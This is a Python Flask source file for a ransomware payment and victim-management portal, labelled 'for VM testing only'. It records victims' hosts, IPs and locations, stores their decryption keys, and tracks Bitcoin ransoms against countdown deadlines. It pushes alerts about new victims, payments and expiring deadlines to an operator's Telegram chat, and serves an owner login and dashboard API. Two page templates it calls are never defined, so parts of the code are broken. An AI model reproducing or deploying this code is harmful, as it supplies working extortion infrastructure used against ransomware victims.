#!/usr/bin/env python3
"""
PUSS RANSOMWARE PORTAL - ULTIMATE OWNER EDITION WITH TELEGRAM
FOR VM TESTING ONLY
"""

import os
import sys
import json
import time
import random
import hashlib
import threading
import socket
import uuid
import subprocess
import platform
import requests
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, session, render_template_string, redirect, url_for, flash, send_file
from flask_cors import CORS
from functools import wraps

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'puss_vm_test_key_40671Mps19*')
CORS(app)

# ============================================================================
# CONFIGURATION FROM ENVIRONMENT VARIABLES
# ============================================================================

class Config:
    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
    BTC_WALLET = os.environ.get('BTC_WALLET')
    RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5 BTC')
    SERVER_URL = os.environ.get('SERVER_URL', 'https://puss-detect.onrender.com')
    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')

# ============================================================================
# TELEGRAM BOT INTEGRATION
# ============================================================================

class TelegramBot:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
        self.base_url = f"https://api.telegram.org/bot{token}"
    
    def send_message(self, text, parse_mode='HTML'):
        if not self.enabled:
            return False
        try:
            response = requests.post(
                f"{self.base_url}/sendMessage",
                json={
                    'chat_id': self.chat_id,
                    'text': text,
                    'parse_mode': parse_mode
                },
                timeout=5
            )
            return response.status_code == 200
        except:
            return False
    
    def send_photo(self, caption, photo_url=None, photo_bytes=None):
        if not self.enabled:
            return False
        try:
            if photo_bytes:
                files = {'photo': photo_bytes}
                data = {'chat_id': self.chat_id, 'caption': caption}
                response = requests.post(f"{self.base_url}/sendPhoto", data=data, files=files, timeout=5)
            else:
                response = requests.post(
                    f"{self.base_url}/sendPhoto",
                    json={
                        'chat_id': self.chat_id,
                        'photo': photo_url or "https://puss-detect.onrender.com/static/skull.png",
                        'caption': caption
                    },
                    timeout=5
                )
            return response.status_code == 200
        except:
            return False
    
    def notify_new_victim(self, victim):
        """Send notification when new victim registers"""
        if not self.enabled:
            return
        
        message = f"""
💀 <b>NEW VICTIM REGISTERED</b> 💀

<b>ID:</b> <code>{victim['id']}</code>
<b>Hostname:</b> {victim['hostname']}
<b>IP:</b> {victim['ip']}
<b>Location:</b> {victim['city']}, {victim['country']}
<b>OS:</b> {victim['os']}
<b>Files:</b> {victim['files_encrypted']}
<b>Ransom:</b> {victim['ransom']}
<b>Deadline:</b> {victim['payment_deadline'][:10]}

<a href='{Config.SERVER_URL}/owner/dashboard'>View in Dashboard</a>
"""
        self.send_message(message)
    
    def notify_payment(self, victim):
        """Send notification when payment received"""
        if not self.enabled:
            return
        
        message = f"""
✅ <b>PAYMENT RECEIVED</b> ✅

<b>Victim:</b> <code>{victim['id']}</code>
<b>Amount:</b> {victim['ransom']}
<b>TX ID:</b> <code>{victim['payment_tx']}</code>
<b>Location:</b> {victim['city']}, {victim['country']}

<a href='{Config.SERVER_URL}/owner/dashboard'>View in Dashboard</a>
"""
        self.send_message(message)
    
    def notify_deadline_approaching(self, victim, hours_left):
        """Send notification when deadline is approaching"""
        if not self.enabled:
            return
        
        message = f"""
⚠️ <b>DEADLINE APPROACHING</b> ⚠️

<b>Victim:</b> <code>{victim['id']}</code>
<b>Hours left:</b> {hours_left}
<b>Ransom:</b> {victim['ransom']}
<b>Location:</b> {victim['city']}, {victim['country']}

<a href='{Config.SERVER_URL}/owner/dashboard'>View in Dashboard</a>
"""
        self.send_message(message)
    
    def notify_expired(self, victim):
        """Send notification when deadline expires"""
        if not self.enabled:
            return
        
        message = f"""
💀 <b>DEADLINE EXPIRED</b> 💀

<b>Victim:</b> <code>{victim['id']}</code>
<b>Ransom Lost:</b> {victim['ransom']}
<b>Location:</b> {victim['city']}, {victim['country']}

<a href='{Config.SERVER_URL}/owner/dashboard'>View in Dashboard</a>
"""
        self.send_message(message)
    
    def send_stats(self, stats):
        """Send daily stats"""
        if not self.enabled:
            return
        
        message = f"""
📊 <b>DAILY STATISTICS</b> 📊

<b>Total Victims:</b> {stats['total']}
<b>Paid:</b> {stats['paid']}
<b>Unpaid:</b> {stats['unpaid']}
<b>Expired:</b> {stats['expired']}
<b>Success Rate:</b> {stats['success_rate']}%
<b>BTC Collected:</b> {stats['paid_btc']}
<b>Potential BTC:</b> {stats['potential_btc']}

<b>Top Countries:</b>
"""
        # Add top 5 countries
        sorted_countries = sorted(stats['countries'].items(), key=lambda x: x[1], reverse=True)[:5]
        for country, count in sorted_countries:
            message += f"\n• {country}: {count}"
        
        self.send_message(message)

# Initialize Telegram bot
telegram = TelegramBot(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)

# ============================================================================
# DATA STORAGE
# ============================================================================

class PussDatabase:
    def __init__(self, db_file="puss_victims.json"):
        self.db_file = db_file
        self.victims = {}
        self.logs = []
        self.owner_password = Config.OWNER_PASSWORD
        self.settings = {
            'ransom_amount': Config.RANSOM_AMOUNT,
            'payment_window': 72,
            'auto_delete': False,
            'telegram_notifications': telegram.enabled,
            'dark_mode': True,
            'blood_effects': True
        }
        self.load()
        self.start_deadline_checker()
    
    def load(self):
        try:
            if os.path.exists(self.db_file):
                with open(self.db_file, 'r') as f:
                    data = json.load(f)
                    self.victims = data.get('victims', {})
                    self.logs = data.get('logs', [])
                    self.settings.update(data.get('settings', {}))
        except:
            self.victims = {}
            self.logs = []
    
    def save(self):
        with open(self.db_file, 'w') as f:
            json.dump({
                'victims': self.victims,
                'logs': self.logs[-100:],
                'settings': self.settings
            }, f, indent=2)
    
    def start_deadline_checker(self):
        """Start background thread to check deadlines"""
        def check_deadlines():
            while True:
                try:
                    now = datetime.now()
                    for vid, victim in self.victims.items():
                        if victim.get('status') == 'unpaid':
                            deadline = datetime.fromisoformat(victim['payment_deadline'])
                            hours_left = (deadline - now).total_seconds() / 3600
                            
                            # Notify at 24, 12, 6, 1 hours
                            if 23 < hours_left <= 24:
                                if not victim.get('notified_24h'):
                                    telegram.notify_deadline_approaching(victim, 24)
                                    victim['notified_24h'] = True
                                    self.save()
                            elif 11 < hours_left <= 12:
                                if not victim.get('notified_12h'):
                                    telegram.notify_deadline_approaching(victim, 12)
                                    victim['notified_12h'] = True
                                    self.save()
                            elif 5 < hours_left <= 6:
                                if not victim.get('notified_6h'):
                                    telegram.notify_deadline_approaching(victim, 6)
                                    victim['notified_6h'] = True
                                    self.save()
                            elif 0 < hours_left <= 1:
                                if not victim.get('notified_1h'):
                                    telegram.notify_deadline_approaching(victim, 1)
                                    victim['notified_1h'] = True
                                    self.save()
                            elif hours_left <= 0:
                                if not victim.get('notified_expired'):
                                    telegram.notify_expired(victim)
                                    victim['notified_expired'] = True
                                    self.save()
                except:
                    pass
                time.sleep(60)  # Check every minute
        
        thread = threading.Thread(target=check_deadlines, daemon=True)
        thread.start()
    
    def add_log(self, level, message, victim_id=None):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'level': level,
            'message': message,
            'victim_id': victim_id
        }
        self.logs.append(log_entry)
        self.save()
        return log_entry
    
    def add_victim(self, victim_id, files_count, hostname=None, ip=None, country=None, city=None, lat=None, lon=None, os_info=None):
        from cryptography.fernet import Fernet
        encryption_key = Fernet.generate_key().decode()
        
        self.victims[victim_id] = {
            'id': victim_id,
            'files_encrypted': files_count,
            'ransom': self.settings['ransom_amount'],
            'wallet': Config.BTC_WALLET,
            'status': 'unpaid',
            'payment_deadline': (datetime.now() + timedelta(hours=self.settings['payment_window'])).isoformat(),
            'created_at': datetime.now().isoformat(),
            'decryption_key': encryption_key,
            'hostname': hostname or 'UNKNOWN',
            'ip': ip or '0.0.0.0',
            'country': country or 'Unknown',
            'city': city or 'Unknown',
            'lat': lat or 0,
            'lon': lon or 0,
            'os': os_info or 'Unknown',
            'paid_at': None,
            'payment_tx': None,
            'last_seen': datetime.now().isoformat(),
            'notes': '',
            'tags': [],
            'notified_24h': False,
            'notified_12h': False,
            'notified_6h': False,
            'notified_1h': False,
            'notified_expired': False
        }
        self.save()
        self.add_log('INFO', f"New victim registered: {victim_id}", victim_id)
        
        # Send Telegram notification
        telegram.notify_new_victim(self.victims[victim_id])
        
        return self.victims[victim_id]
    
    def get_victim(self, victim_id):
        return self.victims.get(victim_id.upper())
    
    def verify_payment(self, victim_id, tx_id):
        victim_id = victim_id.upper()
        if victim_id in self.victims:
            self.victims[victim_id]['status'] = 'paid'
            self.victims[victim_id]['payment_tx'] = tx_id
            self.victims[victim_id]['paid_at'] = datetime.now().isoformat()
            self.save()
            self.add_log('SUCCESS', f"Payment verified for {victim_id}: {tx_id}", victim_id)
            
            # Send Telegram notification
            telegram.notify_payment(self.victims[victim_id])
            
            return True
        return False
    
    def update_victim(self, victim_id, data):
        victim_id = victim_id.upper()
        if victim_id in self.victims:
            self.victims[victim_id].update(data)
            self.victims[victim_id]['last_seen'] = datetime.now().isoformat()
            self.save()
            return True
        return False
    
    def get_all_victims(self):
        return self.victims
    
    def get_stats(self):
        total = len(self.victims)
        paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
        unpaid = total - paid
        expired = sum(1 for v in self.victims.values() 
                     if v.get('status') == 'unpaid' 
                     and datetime.fromisoformat(v['payment_deadline']) < datetime.now())
        
        try:
            amount = float(self.settings['ransom_amount'].split()[0])
            total_btc = paid * amount
            potential_btc = total * amount
        except:
            total_btc = paid * 0.5
            potential_btc = total * 0.5
        
        countries = {}
        for v in self.victims.values():
            country = v.get('country', 'Unknown')
            countries[country] = countries.get(country, 0) + 1
        
        return {
            'total': total,
            'paid': paid,
            'unpaid': unpaid,
            'expired': expired,
            'total_btc': total_btc,
            'paid_btc': f"{total_btc:.2f}",
            'potential_btc': f"{potential_btc:.2f}",
            'admin_email': Config.ADMIN_EMAIL,
            'countries': countries,
            'success_rate': round((paid/total*100) if total > 0 else 0, 1)
        }
    
    def delete_victim(self, victim_id):
        victim_id = victim_id.upper()
        if victim_id in self.victims:
            del self.victims[victim_id]
            self.save()
            self.add_log('WARNING', f"Victim deleted: {victim_id}")
            return True
        return False
    
    def bulk_delete(self, status=None):
        to_delete = []
        for vid, v in self.victims.items():
            if status is None or v.get('status') == status:
                to_delete.append(vid)
        
        for vid in to_delete:
            del self.victims[vid]
        
        self.save()
        self.add_log('INFO', f"Bulk deleted {len(to_delete)} victims")
        return len(to_delete)
    
    def extend_deadline(self, victim_id, hours):
        victim_id = victim_id.upper()
        if victim_id in self.victims:
            current = datetime.fromisoformat(self.victims[victim_id]['payment_deadline'])
            new_deadline = current + timedelta(hours=hours)
            self.victims[victim_id]['payment_deadline'] = new_deadline.isoformat()
            self.save()
            self.add_log('INFO', f"Extended deadline for {victim_id} by {hours}h", victim_id)
            return True
        return False
    
    def add_note(self, victim_id, note):
        victim_id = victim_id.upper()
        if victim_id in self.victims:
            self.victims[victim_id]['notes'] = note
            self.save()
            return True
        return False
    
    def add_tag(self, victim_id, tag):
        victim_id = victim_id.upper()
        if victim_id in self.victims:
            if 'tags' not in self.victims[victim_id]:
                self.victims[victim_id]['tags'] = []
            if tag not in self.victims[victim_id]['tags']:
                self.victims[victim_id]['tags'].append(tag)
                self.save()
            return True
        return False
    
    def get_logs(self, limit=50):
        return self.logs[-limit:]
    
    def update_settings(self, new_settings):
        self.settings.update(new_settings)
        self.save()
        self.add_log('INFO', "Settings updated")
        return self.settings
    
    def send_telegram_message(self, message):
        """Manually send Telegram message"""
        return telegram.send_message(message)
    
    def broadcast_to_all(self, message):
        """Broadcast message to all victims (simulated)"""
        self.add_log('INFO', f"Broadcast sent: {message}")
        return True

db = PussDatabase()

# ============================================================================
# LOGIN REQUIRED DECORATOR
# ============================================================================

def owner_login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('owner_logged_in'):
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated_function

# ============================================================================
# SCARY HTML TEMPLATE
# ============================================================================

INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💀 PUSS DARKNET PORTAL 💀</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Special+Elite&display=swap');
        
        body {
            background: #000000;
            font-family: 'Special Elite', 'Courier New', monospace;
            min-height: 100vh;
            color: #ff0000;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Glitch Background */
        .glitch-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(255,0,0,0.03) 0px,
                rgba(0,0,0,0.9) 2px,
                transparent 3px
            );
            pointer-events: none;
            z-index: 1;
            animation: scan 8s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(100%); }
        }
        
        /* Blood Drip Animation */
        .blood-drip {
            position: fixed;
            top: -20%;
            left: 0;
            width: 100%;
            height: 120%;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M10,0 Q20,20 15,40 Q10,60 20,80 Q30,100 25,120 Q20,140 30,160 Q40,180 35,200" stroke="%23ff0000" fill="none" stroke-width="0.5" opacity="0.2"/><path d="M50,0 Q60,30 55,60 Q50,90 65,120 Q80,150 70,180 Q60,210 75,240" stroke="%23ff0000" fill="none" stroke-width="0.5" opacity="0.2"/><path d="M80,0 Q85,40 82,80 Q79,120 88,160 Q97,200 90,240" stroke="%23ff0000" fill="none" stroke-width="0.5" opacity="0.2"/></svg>');
            background-repeat: repeat-x;
            background-size: 100% 100%;
            pointer-events: none;
            z-index: 2;
            animation: drip 20s linear infinite;
        }
        
        @keyframes drip {
            0% { transform: translateY(-10%); }
            100% { transform: translateY(10%); }
        }
        
        /* Main Container */
        .container {
            position: relative;
            z-index: 10;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Header with Glitch Effect */
        .header {
            text-align: center;
            padding: 40px 20px;
            position: relative;
            margin-bottom: 30px;
        }
        
        h1 {
            font-family: 'Creepster', cursive;
            font-size: 80px;
            color: #ff0000;
            text-shadow: 
                2px 2px 0 #8b0000,
                4px 4px 0 #660000,
                0 0 20px #ff0000;
            position: relative;
            animation: glitch 3s infinite;
        }
        
        @keyframes glitch {
            0%, 100% { transform: skew(0deg, 0deg); opacity: 1; }
            95% { transform: skew(5deg, 2deg); opacity: 0.8; text-shadow: -2px 0 #ff0000, 2px 0 #00ff00; }
            96% { transform: skew(-5deg, -2deg); opacity: 0.9; text-shadow: 2px 0 #ff0000, -2px 0 #0000ff; }
            97% { transform: skew(0deg, 0deg); opacity: 1; }
        }
        
        .subtitle {
            font-size: 20px;
            color: #ff6666;
            text-shadow: 0 0 10px #ff0000;
            margin-top: 10px;
        }
        
        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(20, 0, 0, 0.8);
            border: 2px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            backdrop-filter: blur(5px);
            box-shadow: 0 0 30px rgba(255,0,0,0.3);
            animation: pulse 2s infinite;
            position: relative;
            overflow: hidden;
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,0,0,0.1), transparent);
            transform: rotate(45deg);
            animation: shine 3s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
            50% { box-shadow: 0 0 50px rgba(255,0,0,0.6); }
        }
        
        @keyframes shine {
            0% { transform: translateX(-100%) rotate(45deg); }
            100% { transform: translateX(100%) rotate(45deg); }
        }
        
        .stat-value {
            font-size: 48px;
            font-weight: bold;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #ff9999;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        /* Login Box */
        .login-box {
            background: rgba(20, 0, 0, 0.95);
            border: 3px solid #ff0000;
            border-radius: 15px;
            padding: 40px;
            max-width: 500px;
            margin: 50px auto;
            box-shadow: 0 0 100px rgba(255,0,0,0.5);
            position: relative;
            backdrop-filter: blur(10px);
        }
        
        .login-box h2 {
            text-align: center;
            font-size: 36px;
            color: #ff0000;
            margin-bottom: 30px;
            font-family: 'Creepster', cursive;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            color: #ff9999;
            margin-bottom: 5px;
            font-size: 14px;
            letter-spacing: 2px;
        }
        
        .input-group input {
            width: 100%;
            padding: 15px;
            background: #2a0000;
            border: 2px solid #ff0000;
            color: #ff3333;
            font-family: 'Special Elite', monospace;
            font-size: 16px;
            border-radius: 8px;
            transition: all 0.3s;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #ff6666;
            box-shadow: 0 0 30px #ff0000;
        }
        
        .button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #660000, #ff0000);
            border: none;
            color: #000;
            font-family: 'Creepster', cursive;
            font-size: 24px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
            border: 1px solid #ff6666;
        }
        
        .button:hover {
            background: linear-gradient(45deg, #ff0000, #ff6666);
            box-shadow: 0 0 50px #ff0000;
            transform: scale(1.02);
        }
        
        /* Telegram Status */
        .telegram-status {
            background: rgba(0, 30, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 10px;
            margin-top: 20px;
            text-align: center;
            color: #00ff00;
            font-size: 12px;
        }
        
        /* Blood Counter */
        .blood-counter {
            position: fixed;
            bottom: 20px;
            right: 20px;
            color: #ff0000;
            font-size: 12px;
            opacity: 0.5;
            z-index: 100;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            h1 { font-size: 40px; }
            .stats-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="glitch-bg"></div>
    <div class="blood-drip"></div>
    
    <div class="container">
        <div class="header">
            <h1>💀 PUSS DARKNET 💀</h1>
            <div class="subtitle">> ENCRYPTED CONNECTION_ ESTABLISHED_</div>
        </div>
        
        <div class="stats-grid" id="stats">
            <div class="stat-card">
                <div class="stat-value">...</div>
                <div class="stat-label">LOADING</div>
            </div>
        </div>
        
        <div class="login-box">
            <h2>OWNER ACCESS</h2>
            
            <div class="input-group">
                <label>> PASSWORD_</label>
                <input type="password" id="password" placeholder="********" onkeypress="handleKeyPress(event)">
            </div>
            
            <button class="button" onclick="ownerLogin()">⛓️ ENTER THE DARKNET ⛓️</button>
            
            <div class="telegram-status" id="telegramStatus">
                {% if telegram.enabled %}
                ✅ TELEGRAM BOT ACTIVE
                {% else %}
                ⚠️ TELEGRAM DISABLED
                {% endif %}
            </div>
        </div>
        
        <div class="blood-counter">
            > SYSTEM STATUS: ONLINE | VICTIMS: <span id="victimCount">0</span>
        </div>
    </div>

    <script>
        async function loadStats() {
            try {
                const response = await fetch('/api/stats');
                const stats = await response.json();
                
                document.getElementById('stats').innerHTML = `
                    <div class="stat-card">
                        <div class="stat-value">${stats.total}</div>
                        <div class="stat-label">TOTAL VICTIMS</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${stats.paid}</div>
                        <div class="stat-label">PAID</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${stats.unpaid}</div>
                        <div class="stat-label">UNPAID</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${stats.paid_btc}</div>
                        <div class="stat-label">BTC</div>
                    </div>
                `;
                
                document.getElementById('victimCount').innerText = stats.total;
            } catch(e) {
                console.log('Stats error:', e);
            }
        }

        function handleKeyPress(e) {
            if (e.key === 'Enter') {
                ownerLogin();
            }
        }

        async function ownerLogin() {
            const password = document.getElementById('password').value;
            
            const response = await fetch('/api/owner/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: password})
            });
            
            const data = await response.json();
            if (data.success) {
                window.location.href = '/owner/dashboard';
            } else {
                alert('ACCESS DENIED');
                document.getElementById('password').value = '';
            }
        }

        loadStats();
        setInterval(loadStats, 10000);
    </script>
</body>
</html>
"""

# Add the rest of your templates (VICTIM_HTML and OWNER_DASHBOARD_HTML) here...
# (Keeping them from previous versions for brevity)

# ============================================================================
# API ROUTES
# ============================================================================

@app.route('/')
def index():
    return render_template_string(INDEX_HTML, telegram=telegram)

@app.route('/victim/<victim_id>')
def victim_page(victim_id):
    victim = db.get_victim(victim_id)
    if not victim:
        return redirect('/')
    return render_template_string(VICTIM_HTML, victim_id=victim_id)

@app.route('/owner/dashboard')
@owner_login_required
def owner_dashboard():
    return render_template_string(OWNER_DASHBOARD_HTML, telegram=telegram)

# API Endpoints
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    victim_id = data.get('victim_id', '').upper()
    victim = db.get_victim(victim_id)
    return jsonify({'success': bool(victim)})

@app.route('/api/victim/<victim_id>')
def api_get_victim(victim_id):
    victim = db.get_victim(victim_id)
    return jsonify(victim if victim else {})

@app.route('/api/verify-payment', methods=['POST'])
def api_verify_payment():
    data = request.json
    victim_id = data.get('victim_id', '').upper()
    tx_id = data.get('tx_id', '')
    success = db.verify_payment(victim_id, tx_id)
    return jsonify({'success': success})

@app.route('/api/owner/login', methods=['POST'])
def api_owner_login():
    data = request.json
    password = data.get('password', '')
    if password == db.owner_password:
        session['owner_logged_in'] = True
        return jsonify({'success': True})
    return jsonify({'success': False})

@app.route('/api/owner/logout')
def api_owner_logout():
    session.pop('owner_logged_in', None)
    return jsonify({'success': True})

@app.route('/api/stats')
def api_stats():
    return jsonify(db.get_stats())

@app.route('/api/victims')
@owner_login_required
def api_victims():
    return jsonify(db.get_all_victims())

@app.route('/api/add-victim', methods=['POST'])
def api_add_victim():
    data = request.json
    victim_id = data.get('victim_id', f"VM{random.randint(1000,9999)}").upper()
    files = data.get('files', random.randint(100, 9999))
    hostname = data.get('hostname', socket.gethostname())
    country = data.get('country', 'Unknown')
    city = data.get('city', 'Unknown')
    lat = data.get('lat', 0)
    lon = data.get('lon', 0)
    ip = data.get('ip', request.remote_addr)
    os_info = data.get('os', platform.system() + ' ' + platform.release())
    
    victim = db.add_victim(victim_id, files, hostname, ip, country, city, lat, lon, os_info)
    return jsonify(victim)

@app.route('/api/update-victim', methods=['POST'])
def api_update_victim():
    data = request.json
    victim_id = data.get('victim_id', '').upper()
    files = data.get('files_encrypted', 0)
    success = db.update_victim(victim_id, {'files_encrypted': files})
    return jsonify({'success': success})

@app.route('/api/delete-victim/<victim_id>', methods=['DELETE'])
@owner_login_required
def api_delete_victim(victim_id):
    victim_id = victim_id.upper()
    success = db.delete_victim(victim_id)
    return jsonify({'success': success})

@app.route('/api/bulk-delete', methods=['POST'])
@owner_login_required
def api_bulk_delete():
    data = request.json
    status = data.get('status')
    count = db.bulk_delete(status)
    return jsonify({'success': True, 'count': count})

@app.route('/api/extend-deadline', methods=['POST'])
@owner_login_required
def api_extend_deadline():
    data = request.json
    victim_id = data.get('victim_id', '').upper()
    hours = data.get('hours', 24)
    success = db.extend_deadline(victim_id, hours)
    return jsonify({'success': success})

@app.route('/api/add-note', methods=['POST'])
@owner_login_required
def api_add_note():
    data = request.json
    victim_id = data.get('victim_id', '').upper()
    note = data.get('note', '')
    success = db.add_note(victim_id, note)
    return jsonify({'success': success})

@app.route('/api/add-tag', methods=['POST'])
@owner_login_required
def api_add_tag():
    data = request.json
    victim_id = data.get('victim_id', '').upper()
    tag = data.get('tag', '')
    success = db.add_tag(victim_id, tag)
    return jsonify({'success': success})

@app.route('/api/logs')
@owner_login_required
def api_logs():
    limit = int(request.args.get('limit', 50))
    return jsonify(db.get_logs(limit))

@app.route('/api/settings', methods=['GET', 'POST'])
@owner_login_required
def api_settings():
    if request.method == 'POST':
        settings = request.json
        return jsonify(db.update_settings(settings))
    return jsonify(db.settings)

@app.route('/api/telegram/test', methods=['POST'])
@owner_login_required
def api_telegram_test():
    message = request.json.get('message', '🔔 Test notification from PUSS Dashboard')
    success = telegram.send_message(message)
    return jsonify({'success': success})

@app.route('/api/telegram/broadcast', methods=['POST'])
@owner_login_required
def api_telegram_broadcast():
    message = request.json.get('message', '')
    if not message:
        return jsonify({'success': False, 'error': 'No message'})
    
    success = telegram.send_message(f"📢 BROADCAST:\n\n{message}")
    return jsonify({'success': success})

# ============================================================================
# UNIVERSAL CONTROL PANEL INTEGRATION
# ============================================================================

try:
    from universal_control import Tool, Param
    HAS_CONTROL = True
except ImportError:
    HAS_CONTROL = False

if HAS_CONTROL:
    class PussPortalTool(Tool):
        name = "PUSS Ransomware Portal"
        description = "Darknet ransomware payment portal with Telegram"
        version = "2.0.0"
        
        port = Param.Integer(default=5000, min=1, max=65535, description="Port to run on")
        debug = Param.Boolean(default=False, description="Debug mode")
        
        def execute(self):
            self.log_info(f"Starting PUSS Portal on port {self.port}")
            
            def run_flask():
                app.run(host='0.0.0.0', port=self.port, debug=self.debug)
            
            thread = threading.Thread(target=run_flask)
            thread.daemon = True
            thread.start()
            
            while self.is_running():
                time.sleep(1)
            
            return True

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("💀  PUSS RANSOMWARE PORTAL 💀")
    print("=" * 60)
    print(f"Owner Password: {Config.OWNER_PASSWORD}")
    print(f"Admin Email: {Config.ADMIN_EMAIL}")
    print(f"BTC Wallet: {Config.BTC_WALLET}")
    print(f"Ransom Amount: {Config.RANSOM_AMOUNT}")
    print("-" * 60)
    
    if telegram.enabled:
        print(f"✅ Telegram Bot: ACTIVE")
        # Send startup notification
        telegram.send_message(f"🚀 PUSS Portal started\n🔗 {Config.SERVER_URL}")
    else:
        print("⚠️ Telegram Bot: DISABLED (set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)")
    
    print("=" * 60)
    print(f"Server URL: {Config.SERVER_URL}")
    print("=" * 60)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
